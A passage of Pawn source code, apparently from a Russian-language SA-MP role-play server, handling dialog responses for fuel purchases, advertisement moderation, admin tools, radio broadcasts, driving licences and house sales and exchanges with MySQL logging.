		    if(!response) return cmd_tp(playerid,"");
			new i = ListNick[playerid][listitem];
            SetPlayerPosAdmin(playerid,GPSInfo[i][gpsX],GPSInfo[i][gpsY],GPSInfo[i][gpsZ]);
			new hour, minutes;
			GetPlayerTime(playerid, hour, minutes);
			new ghour1,gminute1,gsecond1;
			gettime(ghour1,gminute1,gsecond1);
			if(hour != ghour1) SetPlayerTime(playerid,ghour1,gminute1);
            SetPlayerVirtualWorld(playerid,0);
            DeletePVar(playerid,"PBIZ");
            SetPlayerInterior(playerid,0);
		}
	
		case 96:
		{
			if(!response)
			{
			    DeletePVar(playerid,"PBIZ");
			    DeletePVar(playerid,"ZapLit");
			    return true;
			}
			if(BizInfo[GetPVarInt(playerid,"PBIZ")][bUl][4]) ShowPlayerDialog(playerid,204,DIALOG_STYLE_LIST,"Способ оплаты","1 | Наличные\n2 | Карта","Далее","Отмена");
			else BuyFuel(playerid);
			
		}
		case 97:
		{
		    if(!response)
		    {
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        return true;
		    }
		    if(BizInfo[GetPVarInt(playerid,"PBIZ")][bProd] < GetPVarInt(playerid,"AmmoProd"))
		    {
		        SendClientMessage(playerid,CGREY,"В магазине кончились продукты");
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        return true;
		    }
			if(PlayerInfo[playerid][pCash] < GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")))
			{
		        SendClientMessage(playerid,CGREY,"Недостаточно средств");
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        return true;
			}
			if(GetFree(playerid,322,1))
			{
		        SendClientMessage(playerid,CGREY,"Недостаточно места в инвентаре");
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        return true;
			}
			/*if(PlayerInfo[playerid][pKan] > 0)
			{
				SendClientMessage(playerid,CGREY,"У вас уже есть канистра");
				DeletePVar(playerid,"AmmoGun");
				DeletePVar(playerid,"AmmoPrice");
			}*/
			PlayerInfo[playerid][pKan]++;
			GiveInv(playerid,322,1);
			SendClientMessage(playerid,CREWARD,"Вы приобрели канистру с бензином. Используйте /fillcar");
			GiveMoney(playerid,-GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")));
			BizMinus(GetPVarInt(playerid,"PBIZ"),GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")),GetPVarInt(playerid,"AmmoProd"));
			ApplyDynamicActorAnimation(BIZBOT[GetPVarInt(playerid,"PBIZ")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
			Update3DTextLabelTextEx(BotLable[GetPVarInt(playerid,"PBIZ")],-1,"Спасибо за покупку");
			SetTimerEx("ClearBotGlobal", 3000, false, "dd", BIZBOT[GetPVarInt(playerid,"PBIZ")],_:BotLable[GetPVarInt(playerid,"PBIZ")]);
   			DeletePVar(playerid,"AmmoGun");
      		DeletePVar(playerid,"AmmoPrice");
		}
  		case 98:
	    {
			new kok[60];
		    if(!response)
		    {
		        if(sscanf(inputtext, "s[60]",kok))
		        {
				    PlayerInfo[GetPVarInt(playerid,"ADS")][pAd] = 0;
				    SendClientMessage(playerid,CREWARD,"Вы отклонили объявление");
    				static const fmt_string2[] = "%s отклонил ваше объявление";
					new str2[sizeof(fmt_string2)+MAX_PLAYER_NAME];
					format(str2, sizeof(str2), fmt_string2,PlayerInfo[playerid][pSendername]);
				    SendClientMessage(GetPVarInt(playerid,"ADS"),CREWARD,str2);
				    DeletePVar(playerid,"ADS");
				    return true;
			    }
			    else
			    {
			    	PlayerInfo[GetPVarInt(playerid,"ADS")][pAd] = 0;
				    SendClientMessage(playerid,CREWARD,"Вы отклонили объявление");
    				static const fmt_string2[] = "%s отклонил ваше объявление. Причина: %s";
					new str2[sizeof(fmt_string2)+MAX_PLAYER_NAME+60];
					format(str2, sizeof(str2), fmt_string2,PlayerInfo[playerid][pSendername],kok);
				    SendClientMessage(GetPVarInt(playerid,"ADS"),CREWARD,str2);
				    DeletePVar(playerid,"ADS");
				    return true;

			    }
		    }
		    else
		    {
				if(PlayerInfo[GetPVarInt(playerid,"ADS")][pAd] == 0)
				{
					SendClientMessage(playerid,CGREY,"Кто-то уже проверил данное обявление");
					DeletePVar(playerid,"ADS");
					return true;
				}
				new py = AdCena*10/100;
				new py1 = AdCena*30/100;
		    	if(sscanf(inputtext, "s[60]",kok))
		    	{
 	    			SetTimerEx("Adgo",30000,false,"ii",GetPVarInt(playerid,"ADS"),playerid);
					PlayerInfo[playerid][pPayDay] += py;
					PlayerInfo[GetPVarInt(playerid,"ADS")][pAd] = 2;
					GiveMoney(GetPVarInt(playerid,"ADS"),-(strlen(PlayerInfo[GetPVarInt(playerid,"ADS")][pAdText])*AdCena));
					SendClientMessage(GetPVarInt(playerid,"ADS"),CGREEN,"Ваше объявление проверено, оно появится через 30 секунд");
					if(!PlayerInfo[playerid][pQuestS][17])
					{
						PlayerQuest[playerid][17][0]++;
						CheckQuest(playerid,17);
					}
					static const fmt_string2[] = "К вашей зарплате прибавлено $%i";
					new str2[sizeof(fmt_string2)+5];
					format(str2, sizeof(str2), fmt_string2,py);
			  		SendClientMessage(playerid,CREWARD,str2);
					Kazna += py1;
                    SetMatsInt("kazna",Kazna);
					DeletePVar(playerid,"ADS");
					return true;

		    	}
                for(new position = 0; (position = strfind(inputtext, "{", true, position)) != -1;)
                {
                    SendClientMessage(playerid,CGREY,"Запрещенные символы!");
                    DeletePVar(playerid,"ADS");
					return true;
                }
				if(strcmp(kok, "Репорт", false) == 0 || strcmp(kok, "репорт", false) == 0)
				{
					static const fmt_string2[] = "[AD] Объявление: %s. Прислал: %s | Отправил: %s";
					new str2[sizeof(fmt_string2)+65+MAX_PLAYER_NAME+MAX_PLAYER_NAME];
					format(str2, sizeof(str2), fmt_string2,PlayerInfo[GetPVarInt(playerid,"ADS")][pAdText],PlayerInfo[GetPVarInt(playerid,"ADS")][pSendername],PlayerInfo[playerid][pSendername]);
					SendAdminMessage(COLOR_SKLAD,str2);
					PlayerInfo[GetPVarInt(playerid,"ADS")][pAd] = 0;
					DeletePVar(playerid,"ADS");
					return true;
				}
				strmid(PlayerInfo[GetPVarInt(playerid,"ADS")][pAdText], kok, 0, strlen(kok), 60);
				PlayerInfo[playerid][pPayDay] += py;
				PlayerInfo[GetPVarInt(playerid,"ADS")][pAd] = 2;
				SetTimerEx("Adgo",30000,false,"ii",GetPVarInt(playerid,"ADS"),playerid);
				GiveMoney(GetPVarInt(playerid,"ADS"),-(strlen(kok)*AdCena));
				if(!PlayerInfo[playerid][pQuestS][17])
				{
					PlayerQuest[playerid][17][0]++;
					CheckQuest(playerid,17);
				}
				SendClientMessage(GetPVarInt(playerid,"ADS"),CGREEN,"Ваше объявление проверено,оно появится через 30 секунд");
				static const fmt_string2[] = "К вашей зарплате прибавлено $%i";
				new str2[sizeof(fmt_string2)+5];
				format(str2, sizeof(str2), fmt_string2,py);
		  		SendClientMessage(playerid,CREWARD,str2);
				Kazna += py1;
    			SetMatsInt("kazna",Kazna);
				DeletePVar(playerid,"ADS");
				return true;
		    	}
	    }
	    case 99:
	    {
	        if(!response) return true;
	        SetPVarInt(playerid,"ADS",ListNick[playerid][listitem+1]);
			static const fmt_string[] = "{FFFFFF}Объявление: %s\n\nВведите в окошко исправленный текст, если он не требует этого нажмите 'Одобрить'\nЧтобы отправить объявление администрации ввведите 'Репорт' без ковычек";
			new str[sizeof(fmt_string)+65];
			format(str, sizeof(str), fmt_string,PlayerInfo[ListNick[playerid][listitem+1]][pAdText]);
			ShowPlayerDialog(playerid,98,DIALOG_STYLE_INPUT,"Проверка объявления",str,"Одобрить","Отклонить");
	    }
	    case 100:
	    {
	        if(!response) return Kick(playerid, FIX_FUNCTION, 1200);
   		    new text;
      		if(sscanf(inputtext, "i",text)) return ShowPlayerDialog(playerid, 100, DIALOG_STYLE_INPUT, "Регистрация","{FFFFFF}Введите возраст игрока от 18 до 70:", "Далее", "");
      		if(text < 18 || text > 70) return ShowPlayerDialog(playerid, 100, DIALOG_STYLE_INPUT, "Регистрация","{FFFFFF}Введите возраст игрока от 18 до 70:", "Далее", "");
      		PlayerInfo[playerid][pVoz] = text;
      		ShowPlayerDialog(playerid,16,DIALOG_STYLE_MSGBOX,"Выбор транспорта для приезда | Шаг [8/8]","{FFFFFF}Сейчас вам предстоит выбрать, на чем вы доберетесь в штат.\nДля выбора используйте красные стрелочки.\nПосле того, как выберите - нажмите кнопку 'Select'.","Далее","");
      		
	    }
		case 101:
		{
		    if(!response) return true;
		    cmd_ah(playerid);
		}
		case 102:
		{
			if(!response) return 1;
			switch(listitem+1)
			{
				case 1:
				{
					foreach(Player, i)
					{
					    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
						if(GetDistanceBetweenPlayers(playerid,i) < 50) SetHealth(i, 100.0),SendClientMessage(i, COLOR_ORANGE, "Администратор выдал вам жизни");
					}
				}
				case 2:
				{
					foreach(Player, i)
					{
					    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
						if(GetDistanceBetweenPlayers(playerid,i) < 50) SetArmour(i, 0.0),SendClientMessage(i, COLOR_ORANGE, "Администратор забрал у вас броню");
					}

				}
				case 3:
				{
					foreach(Player, i)
					{
					    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
						if(GetDistanceBetweenPlayers(playerid,i) < 50) ResetPlayerWeapons(i),SendClientMessage(i, COLOR_ORANGE, "Администратор забрал у вас оружие");
					}
				}
				case 4: if(PlayerInfo[playerid][pAdmin] > 4) ShowPlayerDialog(playerid, 103, DIALOG_STYLE_LIST,"Выдача оружия", "{FFFFFF}Deagle\nSD Pistol\nM4\nAK-47\nSniper Rifle", "Принять", "Закрыть");
			//	case 5: cmd_magic(playerid,"");
				case 5: cmd_music(playerid,"");
			}
		}
		case 103:
		{
			if(!response) return 1;
			new text;
			switch(listitem)
			{
			    case 0: text = 24;
			    case 1: text = 23;
			    case 2: text = 31;
			    case 3: text = 30;
			    case 4: text = 34;
			}
			foreach(Player, i)
			{
			    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
				if(GetDistanceBetweenPlayers(playerid,i) < 50) GivePlayerWeapon(i,text,150),SendClientMessage(i, CREWARD, "Администратор выдал вам оружие");
			}
		}
		case 104:
		{
			if(response)
			{
	   			new Float:x2,Float:y2,Float:z2;
	      		GetPlayerPos(playerid,x2,y2,z2);
	      		for(new i = 0; i < MAX_PLAYERS; i++)
	  			{
		  			if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
			 		PlayAudioStreamForPlayer(i, inputtext, x2,y2,z2, 100, 1);
				}
			}
		}
		case 105:
		{
		    if(!response) return true;
		    switch(listitem)
		    {
		        case 0:
		        {
		            if(PlayerInfo[playerid][pRank] < 3) return SendClientMessage(playerid,CGREY,"Вам недоступна данная функция");
		            new text[30];
		            switch(GetPVarInt(playerid,"Efir"))
		            {
		                case 0:
		                {
							new kek = -1;
       						for(new i = 0; i < MAX_PLAYERS; i++)
							{
							    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
								if(GetPVarInt(playerid,"Efir") > 0) kek = i;
							}
							if(kek > -1)
							{
								static const fmt_str[] = "В эфире уже %i";
								new str[sizeof(fmt_str)+2];
					   			format(str, sizeof(str), fmt_str,PlayerInfo[kek][pSendername]);
					   			SendClientMessage(playerid,CGREY,str);
					   			return true;
							}
							text = "вышел в эфир";
							SetPVarInt(playerid,"Efir",1);
		                }
						case 1:
						{
							text = "вышел из эфира";
							DeletePVar(playerid,"Efir");
						}
		            }
	            	static const fmt_string[] = "[R] %s %s";
					new str[sizeof(fmt_string)+MAX_PLAYER_NAME+30];
					format(str, sizeof(str),fmt_string, PlayerInfo[playerid][pSendername],text);
					SendFMes(F_NEWS,COLOR_SKLAD,str);
		        }
		        case 1:
		        {
		            if(GetPVarInt(playerid,"Efir") == 0) return SendClientMessage(playerid,CGREY,"Вы не в эфире");
					new text[30];
		            switch(zvon)
		            {
		                case 0:
		                {
		                    text = "включил";
							zvon = true;
		                }
		                case 1:
						{
						    text  = "выключил";
							zvon = false;
						}
		            }
	            	static const fmt_string[] = "[R] %s %s прием звонков";
					new str[sizeof(fmt_string)+MAX_PLAYER_NAME+30];
					format(str, sizeof(str),fmt_string, PlayerInfo[playerid][pSendername],text);
					SendFMes(F_NEWS,COLOR_SKLAD,str);
		        }
		        case 2:
		        {
		            if(GetPVarInt(playerid,"Efir") == 0) return SendClientMessage(playerid,CGREY,"Вы не в эфире");
					new text[30];
		            switch(sms)
		            {
		                case 0:
		                {
		                    text = "включил";
							sms = true;
		                }
		                case 1:
						{
						    text  = "выключил";
							sms = false;
						}
		            }
	            	static const fmt_string[] = "[R] %s %s прием SMS";
					new str[sizeof(fmt_string)+MAX_PLAYER_NAME+30];
					format(str, sizeof(str),fmt_string, PlayerInfo[playerid][pSendername],text);
					SendFMes(F_NEWS,COLOR_SKLAD,str);
		        }
				case 3:
				{
				    if(GetPVarInt(playerid,"Efir") == 0) return SendClientMessage(playerid,CGREY,"Вы не в эфире");
				    ShowPlayerDialog(playerid,106,DIALOG_STYLE_INPUT,"Пригласить в эфир","{FFFFFF}Введите ID игрока, которого хотите прогласить в эфир:","Далее","Назад");
				}
				case 4:
				{
					if(GetPVarInt(playerid,"Efir") == 0) return SendClientMessage(playerid,CGREY,"Вы не в эфире");
				    ShowPlayerDialog(playerid,107,DIALOG_STYLE_INPUT,"Выгнать из эфира","{FFFFFF}Введите ID игрока, которого хотите выгнать из эфира:","Далее","Назад");
				}
				case 5: cmd_ads(playerid);
		    }
		}
		case 106:
		{
		    if(!response) return cmd_n(playerid);
		   	new krek;
		    if(sscanf(inputtext,"i",krek)) return ShowPlayerDialog(playerid,106,DIALOG_STYLE_INPUT,"Пригласить в эфир","{FFFFFF}Введите ID игрока, которого хотите прогласить в эфир:","Далее","Назад");
		    if(PlayerLogged[krek] == false)
		    {
		        SendClientMessage(playerid,CGREY,"Игрок не на сервере");
                ShowPlayerDialog(playerid,106,DIALOG_STYLE_INPUT,"Пригласить в эфир","{FFFFFF}Введите ID игрока, которого хотите прогласить в эфир:","Далее","Назад");
                return true;
		    }
		    new Float:x,Float:y,Float:z;
		    GetPlayerPos(krek,x,y,z);
		    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z))
			{
				SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
                ShowPlayerDialog(playerid,106,DIALOG_STYLE_INPUT,"Пригласить в эфир","{FFFFFF}Введите ID игрока, которого хотите прогласить в эфир:","Далее","Назад");
                return true;
			}
			if(GetVehicleModel(GetPlayerVehicleID(krek)) != 582 && GetVehicleModel(GetPlayerVehicleID(krek)) != 488 && !IsPlayerInRangeOfPoint(krek, 5.0,1397.8793,1240.8773,2565.3330))
			{
				SendClientMessage(playerid,CGREY,"Игрок не в здании Central News Network или не в специальном транспорте");
                ShowPlayerDialog(playerid,106,DIALOG_STYLE_INPUT,"Пригласить в эфир","{FFFFFF}Введите ID игрока, которого хотите прогласить в эфир:","Далее","Назад");
                return true;
			}
			SetPVarInt(krek,"EfirGost",1);
  			static const fmt_string[] = "[R] %s пригласил в эфир %s";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+30];
			format(str, sizeof(str),fmt_string, PlayerInfo[playerid][pSendername],PlayerInfo[krek][pSendername]);
			SendFMes(F_NEWS,COLOR_SKLAD,str);
			SendClientMessage(krek,CREWARD,"Вас пригласили в эфир");
		}
		case 107:
		{
		    if(!response) return cmd_n(playerid);
		   	new krek;
		    if(sscanf(inputtext,"i",krek)) return ShowPlayerDialog(playerid,107,DIALOG_STYLE_INPUT,"Выгнать из эфира","{FFFFFF}Введите ID игрока, которого хотите выгнать из эфира:","Далее","Назад");
		    if(PlayerLogged[krek] == false)
		    {
		        SendClientMessage(playerid,CGREY,"Игрок не на сервере");
                ShowPlayerDialog(playerid,107,DIALOG_STYLE_INPUT,"Выгнать из эфира","{FFFFFF}Введите ID игрока, которого хотите выгнать из эфира:","Далее","Назад");
                return true;
		    }
		    if(GetPVarInt(krek,"EfirGost") == 0)
		    {
		        SendClientMessage(playerid,CGREY,"Игрок не в эфире");
                ShowPlayerDialog(playerid,107,DIALOG_STYLE_INPUT,"Выгнать из эфира","{FFFFFF}Введите ID игрока, которого хотите выгнать из эфира:","Далее","Назад");
                return true;
		    }
		    DeletePVar(krek,"EfirGost");
  			static const fmt_string[] = "[R] %s выгнал из эфира %s";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+30];
			format(str, sizeof(str),fmt_string, PlayerInfo[playerid][pSendername],PlayerInfo[krek][pSendername]);
			SendFMes(F_NEWS,COLOR_SKLAD,str);
			SendClientMessage(krek,CREWARD,"Вас выгнали из эфира");
		}
		case 108:
		{
		    if(!response) return DeletePVar(playerid,"WhatLic");
		    switch(GetPVarInt(playerid,"WhatLic"))
		    {
			    case L_MOTO:
				{
					if(PlayerInfo[playerid][pCash] < 100) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
				    GiveMoney(playerid,-100);
			    }
		     	case L_BUS:
				{
					if(PlayerInfo[playerid][pCash] < 170) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
				    GiveMoney(playerid,-170);
			    }
			    case L_GRUZ:
				{
					if(PlayerInfo[playerid][pCash] < 200) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
				    GiveMoney(playerid,-200);
			    }
			    case L_AVTO:
				{
					if(PlayerInfo[playerid][pCash] < 150) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
				    GiveMoney(playerid,-150);
			    }
		    }
		    SetPVarInt(playerid,"LicTest",GetPVarInt(playerid,"WhatLic"));
		    SetPVarInt(playerid,"LicTest1",1);
		//	ApplyDynamicActorAnimation(LicBot,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
			SetPlayerRaceCheckpoint(playerid,2,1040.6938,1341.0570,10.6832,0,0,0,10);
            SetPVarInt(playerid,"GPS",1);
			SendClientMessage(playerid,-1,"Пройдите в транспорт и начните практическое тестирование");
		//	SetTimerEx("ClearBotGlobal", 3000, false,"dd",LicBot,_:LicText);
			DeletePVar(playerid,"WhatLic");
		}

		case 111:
		{
		    if(!response) return true;
			new i = GetPVarInt(playerid,"PHOUSE");
			if(HInfo[i][hLock] == 1 && !IsACop(playerid)) return SendClientMessage(playerid,CGREY,"Дверь закрыта");
			if(!strcmp(HInfo[i][hOwner],"None",true)) SendClientMessage(playerid,-1,"Дом свободен! Для покупки используйте: {f7ae11}/buyhouse");
			SetPlayerPos(playerid,HInfo[i][hXX],HInfo[i][hYY],HInfo[i][hZZ]);
			SetPlayerInterior(playerid,HInfo[i][hInt]);
			SetPlayerVirtualWorld(playerid,HInfo[i][hVirt]);
		}
		case 112:
		{
		    if(!response) return true;
		    if(GetPlayerHouse(playerid))
		    {
		        GiveMoney(playerid,(PlayerInfo[playerid][pVip] > gettime()) ? (GetProcent(HInfo[GetPVarInt(playerid,"PlayerHouse")][hCost],1)) : (GetProcent(HInfo[GetPVarInt(playerid,"PlayerHouse")][hCost])));
		        HInfo[GetPVarInt(playerid,"PlayerHouse")][hOplata] = 0;
		        HInfo[GetPVarInt(playerid,"PlayerHouse")][hLock] = 0;
		        strmid( HInfo[GetPVarInt(playerid,"PlayerHouse")][hOwner], "None", 0, strlen("None"), 32);
		        strmid( HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel1], "None", 0, strlen("None"), 32);
		        strmid( HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel2], "None", 0, strlen("None"), 32);
		        strmid( HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel3], "None", 0, strlen("None"), 32);
		        strmid( HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel4], "None", 0, strlen("None"), 32);
       			DestroyDynamicPickup(HInfo[GetPVarInt(playerid,"PlayerHouse")][hPick]);
				DestroyDynamicMapIcon(HInfo[GetPVarInt(playerid,"PlayerHouse")][hMap]);
				HInfo[GetPVarInt(playerid,"PlayerHouse")][hMap] = CreateDynamicMapIcon(HInfo[GetPVarInt(playerid,"PlayerHouse")][hX],HInfo[GetPVarInt(playerid,"PlayerHouse")][hY],HInfo[GetPVarInt(playerid,"PlayerHouse")][hZ], 31, 0,-1,-1,-1,200.0);
				HInfo[GetPVarInt(playerid,"PlayerHouse")][hPick] = CreateDynamicPickup(1273,23,HInfo[GetPVarInt(playerid,"PlayerHouse")][hX],HInfo[GetPVarInt(playerid,"PlayerHouse")][hY],HInfo[GetPVarInt(playerid,"PlayerHouse")][hZ],0);
                query = "";
				format(query, sizeof(query), "UPDATE testhouse SET hOwner = 'None',hOplata = 0,hLock = 0,hZasel1 = 'None',hZasel2 = 'None',hZasel3 = 'None',hZasel4 = 'None'  WHERE id = '%d' LIMIT 1", GetPVarInt(playerid,"PlayerHouse"));
				mysql_tquery(mysql,query);
				query = "";
				format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Продал дом №%d в гос. (+%d$)','%d')",PlayerInfo[playerid][pID],GetPVarInt(playerid,"PlayerHouse"),(PlayerInfo[playerid][pVip] > gettime()) ? (GetProcent(HInfo[GetPVarInt(playerid,"PlayerHouse")][hCost],1)) : (GetProcent(HInfo[GetPVarInt(playerid,"PlayerHouse")][hCost])),gettime());
				mysql_tquery(mysql,query);
				DeletePVar(playerid,"PlayerHouse");
				
				SendClientMessage(playerid,CREWARD,"Вы продали дом государству");
		    }
		    else SendClientMessage(playerid,CGREY,"У Вас нет дома");
		}
		case 113:
		{
		    if(!response)
		    {
		        DeletePVar(playerid,"CHid");
		        DeletePVar(playerid,"CHcena");
		        return true;
		    }
		    new Float:x,Float:y,Float:z;
		    GetPlayerPos(GetPVarInt(playerid,"CHid"),x,y,z);
		    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
			if(!GetPlayerHouse(GetPVarInt(playerid,"CHid"))) return SendClientMessage(playerid,CGREY,"У Игрока нет дома");
			if(GetPred(GetPVarInt(playerid,"CHid")) == 1) return SendClientMessage(playerid,CGREY,"Игроку уже кто-то что-то предложил");
	    	SendClientMessage(playerid,CREWARD,"Вы предложили игроку обменяться домами");
   			static const fmt_string1[] = "%s предложил Вам обменяться домами. С Вашей доплатой: $%i";
			new str1[sizeof(fmt_string1)+32+10+32];
			format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],GetPVarInt(playerid,"CHcena"));
			SendClientMessage(GetPVarInt(playerid,"CHid"),0xFF7F50FF,str1);
			SendClientMessage(GetPVarInt(playerid,"CHid"),CWHITE,"Для согласия нажмите{FF7F50} [Y]{FFFFFF} ,для отказа нажмите {FF7F50}[N]");
			SetPVarInt(GetPVarInt(playerid,"CHid"),"ChomeID",playerid);
			SetPVarInt(GetPVarInt(playerid,"CHid"),"ChomeCena",GetPVarInt(playerid,"CHcena"));
			DeletePVar(playerid,"CHid");
			DeletePVar(playerid,"CHcena");
		}
		case 114:
		{
		    if(!response)
		    {
		        DeletePVar(playerid,"ChomeID");
		        DeletePVar(playerid,"ChomeCena");
		        return true;
		    }
		    new Float:x,Float:y,Float:z;
		    GetPlayerPos(GetPVarInt(playerid,"ChomeID"),x,y,z);
		    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z))
			{
		        DeletePVar(playerid,"ChomeID");
		        DeletePVar(playerid,"ChomeCena");
				return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
			}
			if(!GetPlayerHouse(GetPVarInt(playerid,"ChomeID")))
			{
   				DeletePVar(playerid,"ChomeID");
		        DeletePVar(playerid,"ChomeCena");
				return SendClientMessage(playerid,CGREY,"У Игрока нет дома");
			}
			if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"ChomeCena"))
			{
   				DeletePVar(playerid,"ChomeID");
		        DeletePVar(playerid,"ChomeCena");
				return SendClientMessage(playerid,CGREY,"Недостаточно средств");
			}
			strmid(HInfo[GetPVarInt(playerid,"PlayerHouse")][hOwner], PlayerInfo[GetPVarInt(playerid,"ChomeID")][pSendername], 0, strlen(PlayerInfo[GetPVarInt(playerid,"ChomeID")][pSendername]), 32);
			strmid(HInfo[GetPVarInt(GetPVarInt(playerid,"ChomeID"),"PlayerHouse")][hOwner], PlayerInfo[playerid][pSendername], 0, strlen(PlayerInfo[playerid][pSendername]), 32);
            query = "";
			format(query, sizeof(query), "UPDATE testhouse SET hOwner = '%s' WHERE id = '%d' LIMIT 1",PlayerInfo[GetPVarInt(playerid,"ChomeID")][pSendername], GetPVarInt(playerid,"PlayerHouse"));
			mysql_tquery(mysql,query);
			query = "";
			format(query, sizeof(query), "UPDATE testhouse SET hOwner = '%s' WHERE id = '%d' LIMIT 1",PlayerInfo[playerid][pSendername], GetPVarInt(GetPVarInt(playerid,"ChomeID"),"PlayerHouse"));
			mysql_tquery(mysql,query);
			GiveMoney(playerid,-GetPVarInt(playerid,"ChomeCena"));
			GiveMoney(GetPVarInt(playerid,"ChomeID"),GetPVarInt(playerid,"ChomeCena"));
			SendClientMessage(playerid,CREWARD,"Вы объяменялись домами с игроком");
			SendClientMessage(GetPVarInt(playerid,"ChomeID"),CREWARD,"Вы объяменялись домами с игроком");
			query = "";
			format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Обменял дом №%d на №%d c %s (+%d$)','%d')",PlayerInfo[GetPVarInt(playerid,"ChomeID")][pID],GetPVarInt(GetPVarInt(playerid,"ChomeID"),"PlayerHouse"),GetPVarInt(playerid,"PlayerHouse"),PlayerInfo[playerid][pSendername],GetPVarInt(playerid,"ChomeCena"),gettime());
			mysql_tquery(mysql,query);
            query = "";
			format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Обменял дом №%d на №%d c %s (-%d$)','%d')",PlayerInfo[playerid][pID],GetPVarInt(playerid,"PlayerHouse"),GetPVarInt(GetPVarInt(playerid,"ChomeID"),"PlayerHouse"),PlayerInfo[GetPVarInt(playerid,"ChomeID")][pSendername],GetPVarInt(playerid,"ChomeCena"),gettime());
			mysql_tquery(mysql,query);
			
			new kek = GetPVarInt(playerid,"PlayerHouse");
			SetPVarInt(playerid,"PlayerHouse",GetPVarInt(GetPVarInt(playerid,"ChomeID"),"PlayerHouse"));
			SetPVarInt(GetPVarInt(playerid,"ChomeID"),"PlayerHouse",kek);
			DeletePVar(playerid,"ChomeCena");
			DeletePVar(playerid,"ChomeID");
		}
		case 115:
		{
		    if(!response) return true;
		    if(IsPlayerInRangeOfPoint(playerid, 50.0, HInfo[GetPVarInt(playerid,"PHOUSE")][hXX],HInfo[GetPVarInt(playerid,"PHOUSE")][hYY],HInfo[GetPVarInt(playerid,"PHOUSE")][hZZ]) && GetPVarInt(playerid,"PHOUSE") == GetPVarInt(playerid,"PlayerHouse"))
			{
			    ShowPlayerDialog(playerid,116,DIALOG_STYLE_LIST,"Управление домом","{FFFFFF}1 | Открыть/Закрыть дом\n2 | Мебель\n3 | Заселение\n4 | Улучшения\n{F85A5A}5 | Продать дом государтсву\n{F85A5A}6 | Продать дом игроку\n{F85A5A}7 | Обменяться домами с игроком{ffffff}","Далее","Назад");
		    }
		    else SendClientMessage(playerid,CGREY,"Вы не у себя дома");
		}
		case 116:
		{
		    if(!response) return cmd_house(playerid,"");
		    switch(listitem)
		    {
		        case 0:
				{
				    switch(HInfo[GetPVarInt(playerid,"PlayerHouse")][hLock])
				    {
						case 0:
						{
						    HInfo[GetPVarInt(playerid,"PlayerHouse")][hLock] = 1;
						    SetHouseInt(GetPVarInt(playerid,"PlayerHouse"),"hLock",1);
						    SendClientMessage(playerid,CREWARD,"[HOUSE]{FFFFFF} Вы закрыли дом");
						}
						case 1:
						{
						    HInfo[GetPVarInt(playerid,"PlayerHouse")][hLock] = 0;
						    SetHouseInt(GetPVarInt(playerid,"PlayerHouse"),"hLock",0);
						    SendClientMessage(playerid,CREWARD,"[HOUSE]{FFFFFF} Вы открыли дом");
						}
				    }

				}
				case 1:
				{
				
				    new kek = -1,str1[35];
				    query = "";
		   			for(new i = 0; i <= GetSlotClass(GetPVarInt(playerid,"PlayerHouse")); i++)
		   			{
		   			    if(!MebelInfo[i][GetPVarInt(playerid,"PlayerHouse")][mmodel]) continue;
		   			    if(MebelInfo[i][GetPVarInt(playerid,"PlayerHouse")][mx] == 0.0) format(str1, sizeof(str1),"%s (%d) - Установить\n",Furn_GetNameClass(MebelInfo[i][GetPVarInt(playerid,"PlayerHouse")][mmodel]),MebelInfo[i][GetPVarInt(playerid,"PlayerHouse")][mmodel]);
						else format(str1, sizeof(str1),"%s (%d) - Редактировать\n",Furn_GetNameClass(MebelInfo[i][GetPVarInt(playerid,"PlayerHouse")][mmodel]),MebelInfo[i][GetPVarInt(playerid,"PlayerHouse")][mmodel]);
						strcat(query,str1);
		   			    kek++;
		   			}
		   			if(kek == -1) return SendClientMessage(playerid,CGREY,"У Вас нет мебели. Приобрести ее можно в /gps » Основное » Магазин мебели");
					ShowPlayerDialog(playerid,311,DIALOG_STYLE_LIST,"Мебель",query,"Далее","Назад");
				}
				case 2:
				{
				    new stt[200];
				    switch(HInfo[GetPVarInt(playerid,"PlayerHouse")][hTax])
					{
					    case 25:
					    {
					        if(!strcmp(HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel1], "None", true)) strcat(stt,"№1 Заселить\n");
					        else
					        {
					   			static const fmt_string1[] = "%s";
								new str1[sizeof(fmt_string1)+32];
